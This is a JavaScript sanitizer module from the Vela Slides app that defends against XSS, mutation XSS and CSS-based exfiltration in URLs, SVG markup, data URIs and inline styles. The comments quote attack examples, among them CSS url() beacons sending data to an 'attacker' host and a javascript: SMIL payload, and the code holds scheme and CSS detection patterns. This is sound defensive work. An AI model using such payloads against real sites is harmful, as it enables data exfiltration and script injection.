// © 2025-present Rui Quintino. Vela Slides — licensed under ELv2. See LICENSE.
// ━━━ Sanitizers ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
function sanitizeString(val, maxLen = 500) {
  if (typeof val !== "string") return "";
  // Defense-in-depth: strip NULL bytes (sentinel safety for parseInline link
  // extraction), then strip HTML tags. A single pass of /<[^>]*>/ is incomplete:
  // it needs a closing '>', so an unclosed or regex-reconstructed '<script...'
  // could survive. We repeat the tag strip to a fixpoint, then drop any residual
  // tag-opening '<' (one followed by a letter, '!' or '/'). A bare '<' used as
  // math (e.g. 'a < b') is preserved. Truncate last.
  let out = val.replace(/\u0000/g, "");
  let prev;
  do { prev = out; out = out.replace(/<[^>]*>/g, ""); } while (out !== prev);
  return out.replace(/<(?=[a-zA-Z!/])/g, "").slice(0, maxLen);
}

// deckTitle is re-assigned raw (not run through sanitizeString) at a handful of
// merge/import/patch call sites — it only ever reaches ESCAPED text sinks (React
// text nodes, the browser tab title, an exported filename that's already
// character-filtered), so there is no XSS here. But it is neither type- nor
// length-clamped at those sites, so a non-string or absurdly long value could
// still ride into state/storage. Small robustness coercion: always a string,
// capped to a sane title length. (v13.26, F-12)
function sanitizeDeckTitle(t) {
  return String(t == null ? "" : t).slice(0, 200) || "Untitled";
}

function sanitizeUrl(url, allowedProtocols = ["http:", "https:", "mailto:"]) {
  if (typeof url !== "string") return "";
  const trimmed = url.trim();
  if (!trimmed) return "";
  // SECURITY: validate and EMIT in one canonical form — never hand back the raw
  // input after validating a *parsed* view of it. The WHATWG URL parser rewrites
  // "\" → "/" and lets schemeless authority refs ("\\host\share", "//host") inherit
  // the base scheme, so such a value can parse as an authority-bearing URL (passing
  // the allowlist) while its raw bytes survive verbatim into a sink that re-parses
  // them (the DOM, and PowerPoint/PDF export hyperlink targets). Rejecting
  // backslashes, requiring an explicit absolute scheme, and returning the parser's
  // own serialization collapse those differential forms to a plain, already-
  // permitted link instead of a smuggled one.
  if (trimmed.includes("\\")) return "";
  try {
    // new URL()+try/catch; the modern URL.parse() (2024+, returns null instead of
    // throwing) is the eventual simplification once the runtime floor allows it.
    const parsed = new URL(trimmed, "https://placeholder.invalid");
    if (!allowedProtocols.includes(parsed.protocol)) return "";
    if (parsed.host) {
      // Authority-bearing scheme (http/https, and any future allowlisted ftp/ws/…):
      // the parser can synthesize a host from "//"/"\\" refs, so demand an explicit
      // absolute "scheme://" and return the canonical serialization — the exact
      // value validated here, not the raw input. Gating on parsed.host (not a
      // hardcoded scheme pair) auto-covers any authority scheme the allowlist gains.
      if (!/^[a-z][a-z0-9+.\-]*:\/\//i.test(trimmed)) return "";
      return parsed.href;
    }
    // Authority-less scheme (mailto:/data:/tel:): no host to smuggle via "//"/"\\",
    // and canonicalizing would corrupt legit values (mailto query encoding; the
    // data: image path is validated raw downstream). Backslashes already rejected.
    return trimmed;
  } catch (_) { return ""; }
}

// Open a deck-supplied URL safely — re-sanitize at the sink so a javascript:/data:/
// vbscript: link can never reach window.open even if a mutation path skipped import
// sanitization or a future runtime (e.g. desktop webview) allows those schemes.
function openExternalLink(url) {
  const safe = sanitizeUrl(url);
  if (safe) window.open(safe, "_blank", "noopener,noreferrer");
}

// SECURITY (v12.54): allowlist, not blocklist. Mirrors DOMPurify's SVG profile
// (src/tags.ts `svg` + `svgFilters`) with Vela-specific exclusions for our
// threat model (static presentation diagrams, no animation, no cross-doc
// references). Anything not in this set — including the entire HTML rawtext
// family (xmp/noembed/noscript/noframes/plaintext/listing) and any future
// surprise tag — is removed during the walk. Excluded by design (commented
// alongside each group): script/iframe/embed/object/link (XSS sinks),
// foreignObject (re-enters HTML namespace, full HTML XSS surface), use (cross-
// doc reference XSS — Cure53 #283 class), animate/animateColor/animateMotion/
// animateTransform/set/mpath/discard/cursor (SMIL attr-mutation: `<animate
// attributeName=href values=javascript:...>`), handler/listener (legacy
// scripting hooks), font-face (FOUC + URL loaders).
const SVG_ALLOWED_TAGS = new Set([
  // structural
  "svg", "g", "defs", "symbol", "switch", "view", "desc", "title", "metadata",
  "marker", "mask", "clippath", "pattern", "filter",
  // shapes
  "circle", "ellipse", "line", "path", "polygon", "polyline", "rect",
  // text/font (font/glyph/hkern/vkern + tref are deprecated but legitimate; no XSS surface)
  "text", "tspan", "textpath", "tref", "altglyph", "altglyphdef", "altglyphitem",
  "glyph", "glyphref", "font", "hkern", "vkern",
  // gradients / paints
  "lineargradient", "radialgradient", "stop",
  // filter primitives (the `fe*` family — purely declarative pixel ops)
  "feblend", "fecolormatrix", "fecomponenttransfer", "fecomposite",
  "feconvolvematrix", "fediffuselighting", "fedisplacementmap", "fedistantlight",
  "fedropshadow", "feflood", "fefunca", "fefuncb", "fefuncg", "fefuncr",
  "fegaussianblur", "feimage", "femerge", "femergenode", "femorphology",
  "feoffset", "fepointlight", "fespecularlighting", "fespotlight", "fetile",
  "feturbulence",
  // common-but-needs-care (each has explicit attribute filtering downstream)
  "a",      // href passes scheme allowlist
  "image",  // href/xlink:href pass scheme allowlist
  // SECURITY: <style> is deliberately NOT allowed. An inline <style> injected via
  // dangerouslySetInnerHTML applies DOCUMENT-GLOBAL CSS (the cascade is not scoped
  // to the SVG subtree), so deck-supplied selectors + declarations could restyle,
  // hide, relocate, or re-label the trusted application UI — i.e. redress and
  // clickjack real controls. A deck value must never alter the presentation,
  // geometry, hit-testing, or labeling of app chrome (UI-integrity invariant).
  // Legitimate deck paint needs only presentation attributes (fill="url(#id)",
  // gradients, markers), which remain allowed and validated. isSvgStyleSafe (below)
  // is retained for the inline style="" attribute and url-ref presentation
  // attributes, whose reach is element-local, not cascade-global.
]);

// SVG attributes whose value can carry a functional URL reference that the
// browser fetches automatically on render (zero-click). style="…" holds CSS;
// the rest are paint/filter/mask/marker/clip-path/cursor presentation
// attributes that accept url(…) / image-set(…) / etc. Each value is run through
// isSvgStyleSafe() so only same-document url(#fragment) survives — no external
// url(), no image-set()/image()/cross-fade()/src() string sources. (v12.59)
const SVG_URL_REF_ATTRS = new Set([
  "style", "fill", "stroke", "filter", "mask", "clip-path",
  "marker", "marker-start", "marker-mid", "marker-end", "cursor", "color-profile",
]);

// SVG CSS-value filter for the inline style="" attribute and url-ref
// presentation attributes (fill/stroke/filter/mask/clip-path/marker/cursor).
// The <style> ELEMENT is no longer allowed (see SVG_ALLOWED_TAGS) — a
// document-global stylesheet is dropped outright, not filtered — so this guards
// only element-local CSS values. The threat here: a value like
// background:url("https://attacker/?d=...") or image-set("https://…") fires an
// outbound GET on render — a zero-click exfil beacon with no CSP backstop inside
// the artifact srcdoc. We allow url(#fragment) (SVG paint servers, markers,
// gradients, clip-paths) and reject everything else that can hit the network or
// use legacy code-execution constructs. CSS \XX escape
// sequences can decode "url" / "@import" past a literal-token regex
// (e.g. \75rl(…) → url(…)), so we conservatively reject any backslash.
// Also reject any '<' or ']]>' — defense-in-depth against rawtext-breakout
// payloads slipped through child node types (CDATA/comment/PI), see v12.52.
function isSvgStyleSafe(css) {
  if (typeof css !== "string" || css.length > 5000) return false;
  if (css.indexOf("\\") !== -1) return false;
  if (css.indexOf("<") !== -1) return false;
  if (css.indexOf("]]>") !== -1) return false;
  // Reject any CSS comment. CSS permits a comment (not just whitespace) as a token
  // separator between a function name and its '('/quoted argument; the fnStr/url()
  // checks below assume only whitespace, so a comment could split the token and let
  // a string-source URL through — a zero-click exfil beacon on render. Legit Vela
  // paint CSS never needs comments; reject outright, mirroring the backslash reject
  // above. (Pairs with the same reject in STYLE_VALUE_REJECT.)
  if (css.indexOf("/*") !== -1) return false;
  if (/expression\s*\(|behavior\s*:|-moz-binding/i.test(css)) return false;
  // Reject any at-rule outright: @import pulls an external sheet and @font-face
  // (with unicode-range) is a per-character font-exfil beacon. Legit Vela paint
  // CSS never needs one. (Supersedes the prior @import-only reject.)
  if (css.indexOf("@") !== -1) return false;
  // Reject any absolute or scheme-relative URL authority. Mirrors STYLE_VALUE_REJECT's
  // `://` guard (which this filter previously lacked) and also catches scheme-relative
  // `//host`. Legit paint CSS (colors, url(#frag), sizes) never contains `//`.
  if (css.indexOf("//") !== -1) return false;
  // Every url() must be a same-document #fragment paint reference (url(#grad)).
  // Match the OPENING url( token and require its first meaningful char (past an
  // optional quote and whitespace) to be '#'. Crucially this does NOT depend on a
  // closing ')': per CSS Syntax L3 §4.3.6 the tokenizer consumes an unterminated
  // `url(https://host` to end-of-input and still emits a valid, fetchable
  // <url-token>, so the prior paren-balanced /url\(...\)/ match missed BOTH the
  // bare and the quoted unterminated forms. An empty url()/url( ) fetches nothing
  // and stays allowed.
  if (/url\s*\(['"\s]*[^#'"\s]/i.test(css)) return false;
  // v12.59: reject any non-url() CSS function fed a string literal. image-set()/
  // image()/cross-fade()/src() (and any future image-ish function) take a bare
  // "https://…" string with NO url() token, so the url() check above misses them
  // — a zero-click outbound GET (CSS-exfil beacon) on render. This shape
  // (function-name + quote) is only ever a URL-by-string in CSS values:
  // rgb()/calc()/var()/translate() never take strings, and font-family:"X" is a
  // bare value, not a call. url(…) is the sole legitimate string-taking function
  // and is already validated to be a #fragment above. Function-name-agnostic, so
  // functions that don't exist yet cannot reopen this. Closes the residual
  // image-set() bypass of the v12.53 url() exfil fix.
  const fnStr = css.match(/[a-z][\w-]*\s*\(\s*['"]/gi);
  if (fnStr && fnStr.some((m) => !/^url\s*\(/i.test(m))) return false;
  // UI-integrity: reject CSS layout/positioning properties. SVG paint via inline
  // style is fine (fill/stroke/opacity/stroke-width/…), but position/inset/z-index/
  // pointer-events let a deck element ESCAPE its container and overlay, hide, or
  // clickjack the trusted app UI — the render sinks in the study-notes / teacher
  // diagram panels are NOT inside a transform+overflow-hidden containing block, so a
  // fixed-positioned SVG element reaches whole-app chrome. This mirrors the exclusion
  // SAFE_STYLE_KEYS already enforces for block.style; the SVG inline-style path (and
  // the presentation-attr values that share this filter) must consult the same bar.
  if (/(?:^|[;{}\s])(?:position|top|left|right|bottom|inset(?:-block|-inline)?(?:-start|-end)?|z-index|pointer-events)\s*:/i.test(css)) return false;
  // Viewport-relative sizing is itself an overlay primitive (a 100vw×100vh element);
  // legit SVG paint never needs it.
  if (/\b[\d.]+(?:vw|vh|vmin|vmax|vi|vb|dvw|dvh|dvi|dvb|svw|svh|lvw|lvh|cqw|cqh|cqi|cqb)\b/i.test(css)) return false;
  return true;
}

function sanitizeSvgMarkup(raw) {
  if (typeof raw !== "string") return "";
  try {
    // Output-side mutation-XSS backstop (nested so the whole sanitizer stays
    // self-contained). The sanitized string is about to be handed to
    // dangerouslySetInnerHTML, which re-parses it in HTML mode. Re-parse it here
    // the SAME way and reject the whole payload if the HTML interpretation
    // exposes a <script> or any event-handler attribute — i.e. the SVG→HTML
    // crossing turned inert markup live. This INDEPENDENT net fails closed even
    // if a node-level filter below is bypassed by a future edit or an unknown
    // parser quirk, so no single missed element reaches the sink live. (v13.19)
    const outputIsClean = (str) => {
      if (!str) return true;
      const d = new DOMParser().parseFromString(`<div>${str}</div>`, "text/html");
      for (const el of d.querySelectorAll("*")) {
        if ((el.localName || "").toLowerCase() === "script") return false;
        for (const a of el.attributes) {
          if (a.name.toLowerCase().startsWith("on")) return false;
        }
      }
      return true;
    };
    const doc = new DOMParser().parseFromString(`<svg xmlns="http://www.w3.org/2000/svg">${raw}</svg>`, "image/svg+xml");
    const err = doc.querySelector("parsererror");
    if (err) return "";
    const walk = (node) => {
      const children = Array.from(node.childNodes);
      for (const child of children) {
        // Keep only element (1) and text (3) nodes. Drop comment (8), CDATA (4) and
        // processing-instruction (7) nodes: they serialize literally (unescaped), so a
        // smuggled </style></title></text> inside CDATA breaks out of rawtext when the
        // serialized string is re-parsed as HTML by dangerouslySetInnerHTML (mutation XSS).
        if (child.nodeType !== 1 && child.nodeType !== 3) { child.remove(); continue; }
        if (child.nodeType === 1) {
          const tag = child.localName.toLowerCase();
          // SECURITY (v12.54): allowlist — anything not explicitly known-safe is removed.
          // Replaces the previous SVG_BLOCKED_TAGS blocklist (inherently incomplete).
          if (!SVG_ALLOWED_TAGS.has(tag)) { child.remove(); continue; }
          // SECURITY (v13.19): namespace-validity invariant — defense in depth
          // against mutation-XSS by namespace confusion. We parse as
          // image/svg+xml, so every legitimately-allowed element lives in the SVG
          // namespace. An element bearing an allowlisted *name* but a non-SVG
          // namespaceURI (an HTML/MathML node smuggled through an integration
          // point, or a parser quirk) is exactly the construct that re-parses
          // differently at the HTML dangerouslySetInnerHTML sink. Drop anything
          // outside the SVG namespace. Mirrors DOMPurify's _checkValidNamespace.
          if (child.namespaceURI !== "http://www.w3.org/2000/svg") { child.remove(); continue; }
          // <style> is not in SVG_ALLOWED_TAGS (removed at the allowlist check
          // above) — an inline stylesheet is document-global, not SVG-scoped, so
          // it is dropped outright rather than filtered. isSvgStyleSafe still runs
          // on the inline style="" attribute and url-ref attrs (element-local reach)
          // in the attribute pass below.
          const attrs = Array.from(child.attributes);
          for (const a of attrs) {
            const name = a.name.toLowerCase();
            if (name.startsWith("on")) { child.removeAttribute(a.name); continue; }
            // src/srcset never appear on legitimate SVG elements (SVG uses href/
            // xlink:href), so they survive the SVG parse inert — but the sanitized
            // string is later parsed in an HTML context (dangerouslySetInnerHTML into a
            // <div>), where <image> is the HTML alias for <img> and src/srcset become a
            // zero-click external fetch on render. Strip them outright. (v12.62)
            if (name === "src" || name === "srcset") { child.removeAttribute(a.name); continue; }
            // SECURITY: href/xlink:href are ALLOWLIST after DOMParser normalization.
            // Entities (&#x3a;, &#58;, &#115;) are already decoded by the parser; we strip
            // ASCII control/whitespace (browsers ignore them inside a scheme — "java\tscript:"
            // is "javascript:"), then check via fixed allowlists. Mixed-case is folded by
            // toLowerCase(). Blocklist alone would let file:, blob:, chrome:, intent:, etc.
            if (name === "href" || name === "xlink:href") {
              const norm = a.value.replace(/[\u0000-\u0020]+/g, "");
              const lower = norm.toLowerCase();
              // <a href> = BUCKET B (click nav): http/https/mailto/tel only.
              // Every OTHER href/xlink:href (image/feImage/use/tref/altGlyph/…) =
              // BUCKET A (auto-fetched on render): same-document #fragment ONLY — no
              // external, no data:, no blob:. Vela decks load nothing external. Closes
              // <feImage href> (Roundcube-class) + external <image href> zero-click
              // beacons the old http/https allowance left open on non-anchors. (v12.59)
              if (name === "href" && tag === "a") {
                const m = norm.match(/^([a-z][a-z0-9+\-.]*):/i);
                if (m && !["http", "https", "mailto", "tel"].includes(m[1].toLowerCase())) { child.removeAttribute(a.name); continue; }
              } else if (!lower.startsWith("#")) {
                child.removeAttribute(a.name); continue;
              }
            }
            const val = a.value.trim().toLowerCase();
            // Scheme check ignores ASCII whitespace/control chars (browsers strip tab/newline/CR inside URL schemes — "java\tscript:" === "javascript:")
            const scheme = a.value.replace(/[\u0000-\u0020]+/g, "").toLowerCase();
            if ((name === "href" || name === "xlink:href") && (scheme.startsWith("javascript:") || scheme.startsWith("data:") || scheme.startsWith("vbscript:"))) { child.removeAttribute(a.name); continue; }
            if (name === "xlink:href" && !val.startsWith("#")) { child.removeAttribute(a.name); continue; }
            // BUCKET A — CSS / presentation references that auto-fetch on render:
            // style="…" plus paint/filter/mask/marker/clip-path/cursor attributes.
            // isSvgStyleSafe allows only url(#fragment); rejects external url(),
            // image-set()/image()/cross-fade()/src() string sources, @import and CSS-
            // escape obfuscation. Supersedes the prior style-only js/data check. (v12.59)
            if (SVG_URL_REF_ATTRS.has(name) && !isSvgStyleSafe(a.value)) { child.removeAttribute(a.name); continue; }
          }
          walk(child);
        }
      }
    };
    const root = doc.documentElement;
    walk(root);
    // The sanitized markup is injected via dangerouslySetInnerHTML into an HTML
    // <div>. If the returned string is not SVG-scoped at the top level, the HTML
    // parser runs in HTML insertion mode, where <image> is the spec alias for <img>
    // (and other SVG tags can HTML-alias) — turning deck-supplied content into a
    // zero-click outbound fetch even after attribute filtering. A deck that supplied
    // its own single <svg> root is returned verbatim (renders unchanged); anything
    // else keeps our <svg> wrapper so the sink always parses it in SVG foreign-content
    // scope, neutralizing HTML-aliasing for the whole tag class. (v12.62)
    if (!root.innerHTML.trim()) return "";
    const top = Array.from(root.children);
    const out = (top.length === 1 && (top[0].localName || "").toLowerCase() === "svg")
      ? top[0].outerHTML
      : root.outerHTML;
    // Defense in depth: reject the whole payload if an HTML re-parse would expose
    // script/handlers the SVG parse hid (mutation-XSS backstop). (v13.19)
    return outputIsClean(out) ? out : "";
  } catch (_) { return ""; }
}

// Inline data: images for image-block src / slide bgImage / branding logo.
// Raster types are inert in an <img>. data:image/svg+xml is LIVE SVG — the same
// markup the dedicated svg block routes through sanitizeSvgMarkup — so it gets
// the identical decode -> sanitize -> re-encode treatment here rather than
// relying on the browser's <img> SVG sandbox (the only thing that stops a deck
// SVG's external <image>/<style url()> from firing in a non-sandboxed context
// such as the local dev server / a desktop webview). Non-image data: types are
// dropped (a stricter, consistent allowlist than the prior data:-only logo rule).
// Raster branch is END-ANCHORED to a pure base64 payload: a prefix-only test let
// arbitrary trailing bytes ride along on the value, which then broke out of an
// unquoted CSS url() at a background sink. Anchoring to `;base64,<base64>$` means
// nothing can follow the image data, so the validated string is safe to return
// as-is. (The bare `data:image/<t>,<raw>` form is intentionally no longer accepted
// here — real decks always use base64; the raw form was the risky path.)
const SAFE_RASTER_DATA_IMAGE = /^data:image\/(?:png|jpe?g|gif|webp|avif|bmp);base64,[A-Za-z0-9+/]+={0,2}$/i;
function sanitizeImageDataUri(s) {
  if (typeof s !== "string" || !s) return "";
  if (SAFE_RASTER_DATA_IMAGE.test(s)) return s;
  const m = /^data:image\/svg\+xml([^,]*)?,/i.exec(s);
  if (!m) return "";
  const meta = m[1] || "";
  let markup;
  try {
    markup = /;base64/i.test(meta) ? atob(s.slice(m[0].length)) : decodeURIComponent(s.slice(m[0].length));
  } catch (_) { return ""; }
  const clean = sanitizeSvgMarkup(markup);
  if (!clean || !/<svg[\s>]/i.test(clean)) return "";
  return "data:image/svg+xml," + encodeURIComponent(clean);
}

// SECURITY (audit 2025-05, H2): block.style was previously typecheck-only,
// which let a deck (or a Vera prompt-injected tool call) ship CSS values
// like `backgroundImage: url('https://attacker/?d=...')`. Inline styles
// fire an outbound GET on every render with no CSP backstop inside the
// artifact srcdoc — a zero-click data-exfil channel. We now apply both an
// allowlist of safe CSS keys (text/layout/color, no image-loading) AND a
// value filter that rejects url() / expression() / any string-source CSS
// function (image-set()/image()/cross-fade()/src(), name-agnostic) / bare
// scheme / @import / CSS escapes / angle brackets, even on allowlisted keys.
// This is the single canonical CSS external-load/breakout value filter — it is
// reused by scrubColorFields() for the slide/block color scalars, so the two
// surfaces can never drift apart. (SVG CSS uses isSvgStyleSafe() instead, which
// is deliberately distinct: it must ALLOW same-document url(#fragment) paint
// servers, which have no meaning — and so stay rejected — here.)
const SAFE_STYLE_KEYS = new Set([
  // text
  "color", "fontWeight", "fontStyle", "fontSize", "fontFamily",
  "letterSpacing", "lineHeight", "textAlign", "textTransform",
  "textDecoration", "whiteSpace", "wordBreak", "overflowWrap",
  // layout
  "display", "flexDirection", "alignItems", "justifyContent", "gap",
  "padding", "paddingTop", "paddingRight", "paddingBottom", "paddingLeft",
  "margin", "marginTop", "marginRight", "marginBottom", "marginLeft",
  "width", "height", "minWidth", "minHeight", "maxWidth", "maxHeight",
  "boxSizing", "flex", "flexGrow", "flexShrink", "flexBasis", "flexWrap",
  "gridTemplateColumns", "gridTemplateRows", "gridColumn", "gridRow",
  // box
  "backgroundColor", "borderRadius",
  "borderTop", "borderRight", "borderBottom", "borderLeft",
  "borderColor", "borderStyle", "borderWidth",
  "boxShadow", "opacity",
]);
// Trailing `\/\*` rejects any CSS comment: CSS allows a comment (not just the
// `\s*` whitespace this regex's fnStr clause assumes) as a token separator between
// a function name and its '('/quoted argument, which could otherwise split the
// token and let a string-source URL slip past the function-string and `://` checks
// — a zero-click exfil beacon on render. Color/gradient/layout values never contain
// a comment; reject outright (pairs with the same reject in isSvgStyleSafe).
const STYLE_VALUE_REJECT = /url\s*\(|expression\s*\(|@import|:\/\/|[a-z][\w-]*\s*\(\s*['"]|<|\\|\/\*/i;
function sanitizeStyle(style) {
  if (!style || typeof style !== "object" || Array.isArray(style)) return undefined;
  const out = {};
  for (const k of Object.keys(style)) {
    if (!SAFE_STYLE_KEYS.has(k)) continue;
    const v = style[k];
    if (typeof v === "number" && Number.isFinite(v)) { out[k] = v; continue; }
    if (typeof v === "string") {
      if (v.length > 200) continue;
      if (STYLE_VALUE_REJECT.test(v)) continue;
      out[k] = v;
    }
  }
  return out;
}

// Slide- and block-level color/background scalars (bg, color, accent, border,
// dotColor, headerBg, trackColor, cell.bg …) are written straight into inline
// CSS — `background`, `background-image`, `color`, `border`, `fill` — at render
// (e.g. backgroundImage = `url(${slide.bgImage})`). Unlike block.style they never
// passed through sanitizeStyle, so a value like `url(https://x)` fired a
// zero-click outbound GET on render (CSS auto-load exfil beacon — same class as
// the SVG/img holes closed in v12.59, different surface). Vela decks load NOTHING
// external: legit values here are colors and gradients, which need no url(), no
// quoted string-source function (image()/image-set()/cross-fade()/src()), and no
// bare URL. Reuse the canonical STYLE_VALUE_REJECT (defined above) so this surface
// and block.style share ONE filter and can't drift apart. bgImage (a background
// *image*) is clamped to data:image/* separately, like the image block / logo.
const CSS_COLOR_KEY = /^(bg|color|accent|fill|stroke|border)$|(Color|Bg|Border|Gradient|Fill|Stroke)$/;
// Shared body for all three key-pattern scrubbers below: a KEY that names a CSS
// property must carry a STRING or a finite NUMBER — any other shape is
// out-of-schema for a CSS scalar and is DELETED, never passed through. This is
// the fail-CLOSED contract: "produce a value of the declared type, or nothing".
// A matched key whose value is a string still runs the dangerous-primitive/length
// check below; a finite number is inherently safe (it can never carry a `url(`
// token) and is let through unchanged — several of these SAME key names
// (block.gap/height/spacing/maxWidth, slide.gap pre-clamped by
// SLIDE_NUMERIC_BOUNDS) are legitimately plain numeric px values, mirroring how
// sanitizeStyle's own numeric branch already treats style numbers. Every OTHER
// non-string shape (array, boxed String, {toString}/{valueOf} object, boolean,
// NaN/Infinity, plain object) is deleted outright, because every one of those
// shapes reaches the same raw CSS sink downstream (React coerces a non-string,
// non-number style value with `'' + value`, running any custom toString/valueOf)
// and the denylist regex below only inspects real strings.
// Previously a non-string on a matched key was skipped (`continue`), which let
// an array/object payload on an allowlisted key (bg, bgGradient, …) ride through
// untouched into `style.background`, a zero-click CSS exfil beacon on render —
// the denylist was never even consulted for that shape. Inverting the skip into
// a delete (while still admitting the one other genuinely-safe primitive type)
// closes the whole family in one place: it cannot matter what future non-string,
// non-number shape an attacker invents, only string/number values ever reach
// render. One value filter, three key patterns — so the surfaces cannot drift
// apart as they did when each carried its own copy. (v13.26)
function scrubCssFields(obj, keyMatches) {
  if (!obj || typeof obj !== "object") return;
  for (const k of Object.keys(obj)) {
    if (!keyMatches(k)) continue;
    const v = obj[k];
    if (typeof v === "number") { if (!Number.isFinite(v)) delete obj[k]; continue; }
    if (typeof v !== "string") { delete obj[k]; continue; }
    if (v.length > 500 || STYLE_VALUE_REJECT.test(v)) delete obj[k];
  }
}
function scrubColorFields(obj) {
  scrubCssFields(obj, (k) => CSS_COLOR_KEY.test(k));
}

// Companion to scrubColorFields for the non-color LAYOUT/SIZING scalars that a
// few block renderers spread raw into inline style (e.g. grid cell padding /
// borderRadius, svg/heading/text maxWidth, gap, spacing). These reach CSS
// properties that don't accept a url()/image source, so they are not a live
// auto-load sink today — but scrub the same primitives anyway so a future
// renderer change can't promote one into a leak. Legitimate values ("12px",
// "100%", "16px 20px", "calc(100% - 8px)") never match STYLE_VALUE_REJECT, so
// this is feature-transparent. (v12.71)
const CSS_LAYOUT_KEY = /^(padding|margin|gap|spacing|borderRadius|borderWidth|maxWidth|maxHeight|minWidth|minHeight|width|height|inset|top|left|right|bottom)$/;
function scrubLayoutFields(obj) {
  scrubCssFields(obj, (k) => CSS_LAYOUT_KEY.test(k));
}

// SECURITY (sub-object PAINT keys): CSS_COLOR_KEY keys off the names Vela's own
// schema uses, which is sound for the allowlisted top-level slide/block objects
// — a key outside the allowlist cannot exist there at all. Raw-spread SUB-objects
// keep whatever key a deck invents, so they additionally need the CSS property
// families that FETCH: background / mask / filter / cursor and friends, where
// url() is the canonical auto-load channel. Matched on a normalized stem
// (lowercased, letters only, vendor prefix dropped) so background-image,
// backgroundImage, bgImage and WebkitMaskImage all reduce to one test.
//
// Applied ONLY through scrubSubObject, never at the top level: `bgImage` is a
// real slide field carrying a long data: URI that sanitizeSlide validates on its
// own, so pattern-scrubbing it here would strip legitimate slide backgrounds.
// `content` is deliberately absent — it is a documented TEXT field
// (SAFE_BLOCK_KEYS), not a CSS sink, and prose may legitimately carry a URL. (v13.25)
const CSS_PAINT_KEY = /^(bg|background|mask|filter|backdropfilter|clippath|cursor|liststyle|borderimage|shapeoutside|offsetpath|boxshadow|textshadow|behavior|binding)/;
const cssKeyStem = (k) => k.toLowerCase().replace(/[^a-z]/g, "").replace(/^(webkit|moz|ms|epub)/, "");
function scrubPaintFields(obj) {
  scrubCssFields(obj, (k) => CSS_PAINT_KEY.test(cssKeyStem(k)));
}

// VELA:DEV-ONLY:BEGIN
// SECURITY (test surface): the SINGLE gate for every in-app test affordance —
// the window hooks (part-app.jsx), the headless battery entry point and its
// Ctrl+Alt+T / custom-event triggers (part-uitest.jsx), and the render battery
// (part-test.jsx). Test code installs only in local/desktop mode, or when a
// harness opts in by setting window.__velaTestMode BEFORE boot (vela-drive.js
// does this via addInitScript). A hosted artifact satisfies neither, so no
// panel mounts, no listener or keyboard shortcut is registered, and no global
// is written — there is nothing left to reach.
//
// ONE predicate on purpose: three hand-copied conditions is exactly how the
// scrubber surfaces drifted apart. Every caller sits inside a DEV-ONLY fence,
// so `concat.py --release` removes the gate and its callers together and the
// release bundle carries no reference to the test-mode flag at all. (v13.25)
function velaTestSurfaceEnabled() {
  return !!(VELA_LOCAL_MODE || (typeof window !== "undefined" && window.__velaTestMode));
}
// VELA:DEV-ONLY:END

// SECURITY (deck sub-object ingress): the top-level slide/block objects are
// rebuilt from a hardcoded key ALLOWLIST, but their nested SUB-OBJECTS — list
// `items`, grid cells (`cell`), matrix `quadrants`, comparison sides and their
// nested points — are copied by raw object spread and therefore keep arbitrary
// keys. Their safety rests on the pattern scrubbers, so run those on EVERY
// nested object (not just the first level) and additionally drop the reserved
// `_`-prefixed private namespace so a deck cannot forge a renderer-private flag
// on a sub-object either. We deliberately do NOT allowlist sub-object keys: the
// ~14 item shapes read wildly different key sets (see the renderer inventory),
// so an allowlist risks silently dropping a legitimate rendered key. The
// scrubbers only delete a color/layout/style VALUE that is dangerous, never a
// renderer key, so this closes the surface without a rendering blast radius.
// The cap FAILS CLOSED: at the limit the over-deep subtree is DELETED, never
// returned unvisited. A depth guard that simply `return`s hands the attacker the
// switch — nesting one level past the cap is all it takes to opt out of the very
// scrubbers this function exists to guarantee, which is the classic
// strip-and-return recursive-filter bypass. Dropping instead keeps the invariant
// the callers rely on: every object still present here has been scrubbed. The
// sibling caps in this file (MAX_BLOCK_DEPTH, the breadth slices) drop too, and
// renderers read sub-objects at depth 1–3, so the limit is unreachable by real
// authored content.
//
// BUDGET: this counts SUB-OBJECT hops, not block levels, and a legitimately
// nested grid spends ~4 per block level (items array → cell → blocks array →
// block). MAX_BLOCK_DEPTH already caps block nesting and fails closed, so the
// real ceiling for authored content is ~4×MAX_BLOCK_DEPTH; the value below
// clears that with headroom while still bounding recursion. Sizing it to the
// renderer read-depth instead would truncate valid deeply-gridded decks — the
// guard must fail closed on hostile input without eating real content. (v13.25)
const MAX_SUBOBJECT_DEPTH = 32;
function scrubSubObject(obj, depth = 0) {
  if (!obj || typeof obj !== "object") return;
  if (Array.isArray(obj)) {
    if (depth >= MAX_SUBOBJECT_DEPTH) { obj.length = 0; return; }
    for (const el of obj) scrubSubObject(el, depth + 1);
    return;
  }
  // Drop the reserved renderer-private namespace: internal flags are set by our
  // own code AFTER sanitization, never carried in from a deck.
  for (const k of Object.keys(obj)) {
    if (k.charCodeAt(0) === 95 /* "_" */) delete obj[k];
  }
  if ("style" in obj) {
    const s = sanitizeStyle(obj.style);
    if (s && Object.keys(s).length) obj.style = s; else delete obj.style;
  }
  scrubColorFields(obj);
  scrubPaintFields(obj);
  scrubLayoutFields(obj);
  for (const k of Object.keys(obj)) {
    const v = obj[k];
    if (!v || typeof v !== "object") continue;
    if (depth >= MAX_SUBOBJECT_DEPTH) delete obj[k];
    else scrubSubObject(v, depth + 1);
  }
}

// CSS-context output encoders for deck values interpolated into inline CSS at
// render (a `url(...)` position or a bare color token). The value-level allowlists
// above decide WHAT is allowed; these ensure a value cannot break out of its CSS
// context — defense-in-depth so any future/missed value still can't append a second
// (external) background layer. cssUrl quotes + escapes so the value stays a single
// url() string; cssColor passes only a strict color token (else empty, caller falls
// back to a default). Neither permits a bare external URL on its own.
function cssUrl(u) {
  return 'url("' + String(u == null ? "" : u).replace(/[\\"]/g, "\\$&").replace(/[\n\r\f]/g, "") + '")';
}
const CSS_COLOR_OK = /^#[0-9a-f]{3,8}$|^(?:rgb|rgba|hsl|hsla)\([0-9.,%\s/]+\)$|^[a-z]+$/i;
// Fail-closed on TYPE first (v13.26): `String(c)` coerces ANY shape to a string
// before the allowlist test, and a single-element array (`String(["red"])` ===
// "red") or a {toString}/{valueOf} gadget would satisfy CSS_COLOR_OK exactly
// the way a plain string would — the same type-confusion root cause as F-1,
// just re-entering through the encoder instead of the scrubber. Reject any
// non-string outright so this defense-in-depth gate can't be bypassed by shape.
function cssColor(c) {
  if (typeof c !== "string") return "";
  const v = c.trim();
  return (CSS_COLOR_OK.test(v) && !/url\(|\/\*|[<>]/i.test(v)) ? v : "";
}
